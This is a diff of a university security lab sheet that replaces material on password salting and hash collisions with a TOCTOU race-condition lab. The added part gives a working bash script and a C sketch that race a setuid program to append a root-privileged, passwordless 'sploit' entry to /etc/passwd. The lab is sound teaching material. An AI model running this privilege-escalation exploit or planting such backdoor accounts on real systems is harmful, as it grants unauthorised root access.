-  char somehash[] = {0x34, 0x81, 0x9d, 0x7b, 0xee, 0xab, 0xb9, 0x26,
-                     0x0a, 0x5c, 0x85, 0x4b, 0xc8, 0x5b, 0x3e, 0x44};
+[guest-acc-x]: https://help.ubuntu.com/community/PasswordlessGuestAccount
+
+The attacker would still need to unlink the `/tmp/XYZ` file and replace it with a symlink to
+`/etc/passwd` in the narrow time window between the "check" (`access()`) and use of the
+file. Typically, they would do so by running `append` many times in a loop (and perhaps slowing
+down the system to increase the time window), until the attack succeeds.
+ 
+
+</div>
+
+
+
+**Question**
+
+:   Would the ThreadSanitizer help in detecting this problem? Why or why not?
+
+
+
+<div class="solutions">
+
+::: block-caption
+
+Sample solution
+
+:::
+
+It would not. TSan assists in detecting data races, which are to do with multithreaded
+access to a program variable (where at least one thread performs a write).
+
+But the race condition here is not a data race -- the "resource" being contended for is not
+a variable in a program, but a file on the file system. TSan cannot assist us in preventing
+such vulnerabilities.
+
+</div>
+
+
+
+
+
+## Challenge exercise -- exploiting `append.c`
+
+If you have time, you may like to try completing the following exercise.
+
+Suppose we want to exploit the race condition vulnerability in the vulnerable `append.c` program
+in ["A setuid program"](#setuid-append).
+We could try to use it to target
+the password file `/etc/passwd`, which is not writable by normal users.
+We can try to "trick" `append.c` into adding a record to the password file, with a goal of
+creating a new user account that has root privileges, and which we can easily access.
+
+First, let's refresh our memory as to the format of `/etc/password` -- take a look at it by running `less /etc/passwd`.
+
+Inside the password file, each user has an entry, which consists of seven fields separated by
+colons (:).
+The entry for the root user is as follows:
+
+```
+  root:x:0:0:root:/root:/bin/bash
 ```
 
-Strings in C also allow us to use hexadecimal escape sequences, so we could also write the
-following:
+The fields are as follows (`man 5 passwd` gives the details):
 
-```c
-  // fragment 2
-  char somehash[] = "\x34\x81\x9d\x7b\xee\xab\xb9\x26"
-                    "\x0a\x5c\x85\x4b\xc8\x5b\x3e\x44";
+- The first field is the user's login name.
+- The second field
+  indicates if the user account has a normal password or not -- the "`x`"
+  indicates that root user has a password stored in the `/etc/shadow`  file.
+- The next two fields are the user's user ID and
+  group ID -- note that there is nothing to stop multiple records in `/etc/passwd` having
+  the same user ID and group ID. (If that is the case,
+  multiple user *names* will be able to access the same privileges and permissions.)
+- The fifth field is the user's full name and contact details.[^gecos-fn]
+- The sixth field is the login shell.
+
+[^gecos-fn]: Called the ["GECOS" field][gecos-field], for historical reasons --
+  the name [was taken from][gecos-history] an operating system called
+  the General Electric Comprehensive Operating System (GECOS).
+
+[gecos-field]: https://en.wikipedia.org/wiki/Gecos_field
+[gecos-history]: https://www.redhat.com/sysadmin/linux-gecos-demystified
+
+Root's privileges don't come from its name ("`root`"), but from its user ID, 0.
+To create an account with root privileges, we just need to append a record to
+`/etc/passwd` that has a 0 in the third field.
+
+How will we be able to make use of this new root-privileged user? Let's suppose
+the new account is called `sploit`. We will want to be able to log into the `sploit`
+account. We could create a line in `/etc/passwd` that looks
+like the following:
+
+
+```
+  sploit:x:0:0::/root:/bin/bash
 ```
 
-The difference is that in fragment 1, `somehash` is a "plain" array or buffer, of size 16
-elements, but in fragment 2, `somehash` is a null-terminated C string, so the array will be
-of size 17.
+Because the `x` in the second field means there's a password (actually,
+a *hash* of the password) in `/etc/shadow`, we'd need to add a line
+to `/etc/shadow` as well, containing a hash of our desired password.
+This isn't too difficult to do, but an easier way would be to instead
+put the hash of our password in `/etc/passwd`, in place of the `x`.
+Normally, this is considered bad practice and insecure on Unix systems,
+because `/etc/passwd` is world-readable;[^etc-passwd-perms]
+but as an attacker, we probably don't care much about preserving the security
+of the system we're attacking.
 
-Note that best practice suggests that in the above examples, we should [specify an exact
-size][sz] for the array, rather than relying on it being implicitly defined, and should use
-an [`enum` or `#define`][arr] to specify the size, rather than a magic number -- so the
-first example becomes
+On Ubuntu systems, there is an easier method yet. A particular "magic" password value
+is used for [passwordless guest accounts][guest-acc],
+and the magic value is `U6aMy0wojraho` (the
+6th character is zero, not letter O).
+If we put this value in the password field of a user entry, we can just
+hit the return key when prompted for a password, and we can log into the user's
+account.
 
-[sz]: https://wiki.sei.cmu.edu/confluence/display/c/ARR02-C.+Explicitly+specify+array+bounds%2C+even+if+implicitly+defined+by+an+initializer
-[arr]: https://wiki.sei.cmu.edu/confluence/display/c/ARR00-C.+Understand+how+arrays+work
+So our attack should write an entry like the `sploit` user entry
+above, but instead of "`x`", we can use the magic value given above,
+and we will be able to log in to the `sploit` account without
+a password -- for instance, by running `su sploit`.
 
-
-```c
-  // fragment 1
-  enum {
-    HASH_SIZE = 16
-  };
-
-  char somehash[HASH_SIZE] = {
-      0x34, 0x81, 0x9d, 0x7b, 0xee, 0xab, 0xb9, 0x26,
-      0x0a, 0x5c, 0x85, 0x4b, 0xc8, 0x5b, 0x3e, 0x44
-  };
-```
-
+[guest-acc]: https://help.ubuntu.com/community/PasswordlessGuestAccount
 
 <!--
 
-I've seen it suggested that MISRA C explicitly encourages enums over #defines,
-but can't see evidence of that. See e.g. MISRA C 2013.
+```
+  sploit:U6aMy0wojraho:0:0::/root:/bin/bash
+```
 
-MISRA C 2013: document is copyright ... but see
-<https://electrovolt.ir/wp-content/uploads/2022/09/MISRA-C_2012_-Guidelines-for-the-Use-of-the-C-Language-in-Critical-Systems-Motor-Industry-Research-Association-2013-2013.pdf>
+-->
+
+[^etc-passwd-perms]: `/etc/passwd` being world-readable doesn't
+  mean everyone can simply *read* the passwords -- recall that
+  we don't store actual passwords, but only hashes of them.\
+  &nbsp; &nbsp; But it *does* mean that anyone who wanted could
+  take a copy of the `/etc/passwd` file and try to "crack" the passwords
+  (try many combinations, in hopes of finding the correct one) at their
+  leisure,
+  using a program like [John the Ripper][john].
+
+[john]: https://www.openwall.com/john/
+
+
+### Launching the race condition attack
+
+In order to successfully exploit the `append` program, we need to
+make `/tmp/XYZ` point to the password file.
+In order for this critical step to succeed, it has to
+occur within the window between check and use (i.e., between the `access()` and the `fopen()`
+calls in the vulnerable program).
+Let us assume we cannot modify the vulnerable program. (If we are an attacker,
+and we can already modify setuid programs, then we can trivially write one that
+grants root access to anybody who runs it -- like `su` but without requiring
+a password.)
+Therefore, the simplest way to exploit `append.c`
+is to run our attacking program in parallel to "race" against the target program, hoping to win the race
+condition, i.e., changing the link within that critical window.
+We can't achieve the perfect timing needed for this every time we try, but
+given many attempts, we may be able to succeed.
+
+Consider how we can increase the probability. For example, we can
+run the vulnerable program for many times; we only need to achieve success once among all these trials.
+Since you need to run the attacks and the vulnerable program for many times, you need to write a
+program to automate the attack process. To avoid manually typing an input to the vulnerable program
+`append`, you can use input redirection.
+
+Try saving the following file as `launch.sh`, and give it executable permissions:
+
+```bash
+#!/usr/bin/env bash
+
+# You can adjust LIMIT to change
+# the number of times the loop runs.
+LIMIT=1
+
+# uncommenting the following line will print
+# each command as it executes:
+#set -x
+
+orig_file=/tmp/XYZ
+target_file=/etc/passwd
+
+for ((i=0; i < LIMIT; i=i+1)); do
+  rm -rf $orig_file
+  touch $orig_file
+  # replace AAA with the text you want appended to /etc/passwd
+  (echo 'AAA' | nice -n 19 ./append) &
+  unlink $orig_file
+  ln -s $target_file $orig_file
+  # replace BBB with some string that will be found
+  # if your attack is successful.
+  # if you insert a `sleep()` in the append
+  # program, you'll also want to add a sleep command
+  # (see `man 1 sleep`)
+  # here, so your check waits til append has completed.
+  if grep 'BBB' $target_file > /dev/null; then
+    echo "attack succeeded"
+    exit 0
+  fi
+done
+
+echo "attack failed"
+exit 1
+```
+
+If you give this program a higher `LIMIT` and run it, you likely will still not see
+success -- so we need to make our attack *faster*, and `./append` slower. What
+ways are there of doing so?
+
+To show that this sort of attack *can* work, you might like to insert the following
+line (which calls the `sleep()` function, see `man 3 sleep`) --
+
+```
+  sleep(1);
+```
+
+into `append.c`, before the call to `open()`, then recompile `append`
+and run the `bash` script against it. There is now a whole second's delay
+between checking permissions with `access(filename)`, and opening the file
+with `fopen(filename, ...)` -- very easy to exploit.
+
+But a successful exploit of this
+vulnerability should be able to (when run sufficiently many times) take
+advantage of the original `append` program, even without the call to `sleep()`.
+See if you can devise one.
+
+Hint: a C program will be much faster than the Bash script above, and
+the following C functions can be used to unlink (delete) a file
+and create a symlink:
+
+```C
+#define _POSIX_C_SOURCE 200112L
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+
+void somefunc() {
+  unlink("file-to-delete.txt");
+  symlink("src-file", "target-file");
+}
+```
+
+You should also know from previous classes how to use the `system()`
+call to run any other shell commands you want to.
+
+<!--
+
+C:
+rm -rf *.o launch && make CC=gcc CFLAGS="-std=c11 -pedantic -O3 -Wall -Wextra" launch.o launch
+
+man 2 unlink, man 3 symlink
+
+```
+#define _POSIX_C_SOURCE 200112L
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+
+int main(int argc, char ** argv) {
+  system("rm -rf /tmp/XYZ; touch /tmp/XYZ");
+  system("(echo AAA | nice -n 19 ./append) &");
+  unlink("/tmp/XYZ");
+  symlink("/etc/passwd", "/tmp/XYZ");
+  system("tail -n 1 /etc/passwd");
+}
+
+```
+
 
 -->
 
 
-</div>
-
-
-
-**Question 3(b)**
-
-:   What is the purpose of salting passwords, when creating a password hash?
-
-
 
 <div class="solutions">
 
@@ -307,274 +1124,27 @@ Sample solution
 
 :::
 
-Salting passwords prevents several common attacks on passwords.
-
-If a password is used unsalted, directly as is, then every user in the world who
-happens to use the password "qwerty", for instance, will have exactly the
-same hash for their password (assuming the same algorithm is used).
-If we used the MD5 hashing algorithm,[^md5] then every user who uses the password "qwerty"
-will get the hash `d8578edf8458ce06fbc5bb76a58c5ca4`:
-
-[^common-passwords]: See <https://en.wikipedia.org/wiki/Wikipedia:10,000_most_common_passwords>
-[^md5]: Note that as per the lectures, MD5 should **not** be used in practice as a password
-  hashing function; a dedicated function like SCrypt should be used instead.
-
-```
-$ printf qwerty | md5sum
-d8578edf8458ce06fbc5bb76a58c5ca4  -
-```
-
-That means if an attacker happens to get hold of the list of hashed passwords, it's
-extremely easy for them to find out what the user's password is -- *despite* the fact that
-hashes are "difficult to reverse".
-
-The attacker knows that many people choose [very common passwords][common-passwords] and
-that "qwerty" is one of these, and that the MD5 hash of "qwerty" is
-`d8578edf8458ce06fbc5bb76a58c5ca4`. So if the attacker has a list of the hashes of common
-passwords, they'll easily recognize them whenever they appear.
-
-[common-passwords]: https://en.wikipedia.org/wiki/Wikipedia:10,000_most_common_passwords
-[rt]: https://en.wikipedia.org/wiki/Rainbow_table
-
-Adding a random salt to the password destroys this straightforward correspondence between
-password and hash.
-
-
-
-In a bit more detail -- how could attackers try to make use of a list of leaked, but hashed passwords?
-Let's assume an attacker has access to a list of hashes for 100,000 of our customers, and
-wants to obtain the original passwords. There are a
-few options, depending on whether the hashes are salted or unsalted, and what kind of hash
-algorithm we used.
-
-1.  **Full brute-force with real-time hashing (fast hash algorithm and unsalted hashes only)**
-
-    Modern GPUs can compute billions of hashes per second using fast hash algorithms like
-    MD5 (e.g., \~67 billion/sec on a
-    mid-range 5-year-old NVIDIA GPU).[^nvidia] This sounds fast, and can be used to
-    brute-force _short_ passwords that use these algorithms with no salt.
-
-    But once we consider all alphanumeric passwords up to length 8,
-    that's roughly 200 trillion passwords,[^len-8-p] which would take over 8 hours
-    for one full scan. For large-scale attacks (e.g., cracking 100,000 user hashes), this
-    becomes practically impossible due to enormous total time and cost. So attackers
-    _don't_ normally rely on pure brute force.
-
-    Salts are combined with the password (e.g. concatenated or prepended) before hashing, so
-    they effectively expand the password space (e.g. just a 1-byte salt prepended to our
-    $\leq$ length 8 passwords expands the password space from 200 trillion to around 5
-    quadrillion). This makes pure brute force infeasible in most real-world cases.
-
-    (And as we know, modern systems *shouldn't* be using fast hash algorithms like MD5, but dedicated
-    slow password hashing algorithms like bcrypt, scrypt and Argon2.)
-
-    *tl;dr:* Only feasible for very short, unsalted passwords using fast hash functions like
-    MD5.
-
-[^nvidia]: See [here][hashcat-bench]
-  for benchmarks of the Hashcat tool using unsalted MD5 hashes on an
-  NVIDIA GeForce RTX 3090. Graphics processors are often used for password cracking, because
-  they contain many thousands of cores, so can be used to calculate a large number of hashes
-  in parallel.
-
-[hashcat-bench]: https://openbenchmarking.org/test/pts/hashcat&eval%3D56eb2bb43fd8ce50f21bde1f712a2c57b37a8ac9
-
-[^len-8-p]: The number of possible characters is $26 + 26 + 10$ (uppercase, lowercase and
-  digits). So the total number of passwords is
-  $62^1 + 62^2 + ... + 62^8 \approx 2.2 \times 10^{14}$, or around 200 trillion.
-
-2.  **Precomputed hashes (simple in-memory lookup table -- only for fast hash algorithms,
-    with small hash size, and unsalted hashes)**
-
-    Leaked lists exist of, say, 10 million popular plaintext passwords (e.g. the RockYou
-    list[^rockyou]). Assume each password--hash pair includes the plaintext (say, 10 bytes
-    on average -- true for the RockYou list) and an MD5 hash (16 bytes), total storage is
-    then around 300 MB -- easily small enough
-    to fit into RAM. This allows for extremely fast hash-to-password lookups via a simple table.
-
-    The hashes need to be precomputed, but that doesn't take long -- at 67 billions of
-    hashes per second, it takes less than a millisecond.
-
-    The approach breaks down completely, however, if the stored hashes are salted. Each user's
-    hash depends on both the password and a unique salt. For 10,000 users with unique
-    salts, that's effectively 10,000 versions of the 300 MB table -- about 3 terabytes total.
-    (Even more with larger dictionaries or hash algorithms that produce longer bytestrings.
-    SHA-1 produces 20-byte output. Modern algorithms like scrypt, bcrypt and Argon2 are
-    configurable, but typically are used to produce 32 byte hashes, so 6 terabytes total;
-    and the time to precompute the hashes would be much longer, too.)
-
-    *tl;dr:* Very efficient for unsalted hashes, generated from fast hash algorithms which
-    produce smallish-sized output (e.g. MD5), but completely undermined by salting.
-
-[^rockyou]: In 2009, software development company RockYou [was breached][rockyou-wiki]; they stored a list
-  of 14 million passwords in plain text. (See
-  <https://www.kaggle.com/datasets/wjburns/common-password-list-rockyoutxt>). It is widely
-  used in security research and password cracking.
-
-[rockyou-wiki]: https://en.wikipedia.org/wiki/RockYou
-
-3.  **Rainbow tables (in-memory tables with space--time trade-offs)**
-
-    Rainbow tables are a clever optimisation of precomputed hash attacks. Rather than
-    storing every possible password--hash pair, they perform additional calculations
-    at runtime, but can reduce storage requirements drastically. ([Wikipedia][rt]
-    gives a fuller explanation, for those who are interested.)
-
-    For hash algorithms like MD5 or SHA-1, rainbow tables can compress the
-    entire space of all short (e.g. $\leq 8$ character) passwords into a few gigabytes, making
-    it feasible to load the table into RAM. Once in memory, lookups are very fast,
-    even with the extra calculations needed.
-
-    But there are two drawbacks. Firstly, rainbow tables need to be pre-prepared
-    (we need to precompute all the hashes) -- this can take hours or days.
-    Secondly, the entire technique fails if even a single salt byte is added. Since each salt
-    value changes the output hash, a separate rainbow table would be needed for each
-    possible salt. This ends up multiplying storage needs by billions.
-
-    Widespread use of salts has rendered rainbow tables obsolete, except when attacking
-    systems that are old or have very poor security. These do still occur, though -- in
-    June 2020, the online antiques marketplace LiveAuctioneers suffered a data
-    breach, and was discovered to be storing passwords as unsalted MD5 hashes.[^live]
-
-    *tl;dr* Rainbow tables shrink the storage needed for unsalted hash attacks, but are useless against salted hashes.
-
-[^live]: See Troy Hunt, <https://x.com/troyhunt/status/1297036195315085313>, linking to
-  *The Daily Swig* cybersecurity news article, ["LiveAuctioneers data breach: Millions of
-  cracked passwords for sale, say researchers"][liveau]
-
-[liveau]: https://portswigger.net/daily-swig/liveauctioneers-data-breach-millions-of-cracked-passwords-for-sale-say-researchers
-
-4.  **Salted hashes with slow, modern algorithms**
-
-    Best-practice password storage uses a unique, random salt per user, and a
-    key-stretching algorithm designed to be expensive to compute, such as bcrypt,
-    scrypt, or Argon2. These algorithms deliberately slow down hashing to make
-    large-scale attacks computationally impractical, even with modern GPUs or custom
-    hardware.[^asic]
-
-    In practice, how many guesses could an attacker attempt? The above algorithms
-    allow system designers to alter the RAM and time needed to compute a single hash.
-
-    - With bcrypt at cost factor 12 (default in many libraries), a single GPU can
-      manage only 100--200 guesses per second per target.
-    - Argon2 or scrypt with high memory usage may reduce this to 10 guesses
-      per second or fewer.
-
-    So even if a user has used one of the 10 million most common passwords,
-    attacking the hash of just that one user could take a million seconds, which is about
-    12 days. We can't re-use the results of our calculations for other customers,
-    because they all will have a different salt. And spending 12 days each for _all_ the
-    10,000 customers is completely uneconomic.
-
-    This is why salts and slow hashes are important -- they reduce targeted,
-    per-user brute-force attacks to a very slow rate, _even_ when the user has
-    used a short, not very secure password -- and prevent attackers from
-    re-using the results of previous calculations.
-
-    And if a long, unique password is used? Then an attack is not feasible at all --
-    the space of all possible passwords is just too large.
-
-    *tl;dr*: Renders brute force attacks infeasible even for short, bad passwords. For long, good
-    passwords -- no chance.
-
-[^asic]: Field-programmable gate arrays
-  ([FPGAs][fpga]) are more expensive than GPUs, but faster, and tyically have lower power
-  consumption. Custom integrated circuits with a specific hash algorithm "baked in"
-  to them (application-specific integrated circuit, or [ASICs][asic]) are fastest of all and
-  have even lower power consumption, but are inflexible and expensive to produce -- they're
-  used for tasks like Bitcoin mining due to their speed and low operational costs.
-
-
-[fpga]: https://en.wikipedia.org/wiki/Field-programmable_gate_array
-[asic]: https://en.wikipedia.org/wiki/Application-specific_integrated_circuit
-
-<!--
-
-todo --
-
-provide some illustrative figures
-
-A roughly five-year-old graphics card can compute about 67 billion MD5 hashes per
-second.[^nvidia] This means that an attacker using just an old graphics card could
-
-1.  Check all 10 million passwords from a leaked list like RockYou[^rockyou] in less than a
-    millisecond.
-2.  Brute-force all (exactly) 8-character length lowercase passwords (\~200 billion combinations) in just a few seconds.
-3.  Try all (exactly) 10-character lowercase passwords (\~26 trillion combinations) in under a minute.
-4.  Search through all $\leq$ 8-character alphanumeric passwords (\~200 trillion combinations) could be done in
-    about 3--4 minutes.
-
-
-
-TODO:
-
-do we have any stats on how widespread use of salts is?
-
-Troy Hunt of haveibeenpwned occasionally comments
-
-<https://www.troyhunt.com/the-race-to-the-bottom-of-credential-stuffing-lists-and-collections-2-through-5-and-more/>
-- in 2019, mentions salted MD5 hashes, from a breach "at least 10 years old"
-
-in 2020, he tweeted
-
-https://x.com/haveibeenpwned/status/1297034875988357130
-
-> New breach: LiveAuctioneers was hacked in June and 3.4M user accounts exposed. Data
-> included names, email and IP addresses, physical addresses, phones numbers and passwords
-> stored as unsalted MD5 hashes. 79% were already in @haveibeenpwned > . Read more:
-> https://portswigger.net/daily-swig/liveauctioneers-data-breach-millions-of-cracked-passwords-for-sale-say-researchers
-
-so some systems clearly are not using salt at all.
-
--->
+A solution program in C is not provided, but you should be able to
+work out what it would look like. The ultimate goal of this lab in
+any case is not to come up with exactly the same exploit program
+as other people might,
+but rather to understand the nature of TOCTOU vulnerabilities.
 
 </div>
 
 
 
-**Question 3(c)**
+```{=html}
+<h2>Credits</h2>
+```
 
-:   Look up Wikipedia to refresh your memory of what a *hash collision* is. Explain why hash
-    collisions necessarily occur. That is, why must there always be two different plaintexts
-    that have the same hash value?
+The code for sections 4 and 5 of this lab is adapted from the
+Race Condition lab at
+<https://seedsecuritylabs.org/Labs_16.04/PDF/Race_Condition_new.pdf>
+and is copyright Wenliang Du, Syracuse University.
 
-
-
-<div class="solutions">
-
-::: block-caption
-
-Sample solution
-
-:::
-
-Every hash function outputs results which are of some exact, fixed size; the exact size will
-depend on the function. (For instance, we've seen above that the MD5 algorithm always
-outputs hashes of 16 bytes.)
-
-The *input* to a hash function, however, is a sequence (usually of bytes) of arbitrary
-length. The input domain is therefore infinite, but the output range of the function is
-finite: hence, for any one hash value, there must always be an infinite number of plaintexts
-which produce that hash value.
-
-We can see this more straightforwardly if we imagine a hash function that produces outputs of only
-*one* byte in length. Such a function would not be very useful for cryptography purposes
-(can you explain why?), but we could use it for example to distribute items across a hash
-table of size less than 256.
-
-The output of the function is one byte (256 different values), but it will operate on any
-arbitrary sequence of input bytes. It therefore follows that for each of the 256 output
-results, there must be an infinite number of inputs which produce it.
-
-</div>
+<br><br>
 
 
-
-## 3. CITS3007 project
-
-You can use your lab time to work on the CITS3007 project. You may wish to discuss your
-project tests and code design with other students or the lab facilitators (although the
-actual code you submit must be your own, individual work).
-
-<!-- vim: syntax=markdown tw=92 :
+<!-- vim: syntax=markdown tw=92
 -->
